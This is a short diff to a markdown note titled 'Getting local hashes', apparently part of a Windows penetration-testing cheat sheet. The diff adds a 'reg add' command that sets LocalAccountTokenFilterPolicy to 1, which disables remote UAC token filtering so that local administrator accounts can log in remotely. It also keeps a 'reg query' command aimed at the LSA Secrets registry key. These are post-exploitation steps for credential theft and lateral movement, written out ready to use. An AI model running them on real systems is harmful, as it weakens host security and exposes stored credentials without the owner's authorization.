@@ -1,6 +1,12 @@
 # Getting local hashes
 
-Secrets
+## Enable remote admin login
+
+```
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /V LocalAccountTokenFilterPolicy /T REG_DWORD /F /D 1
+```
+
+## Secrets
 
 ```
 reg query HKLM\Security\Policy\Secrets
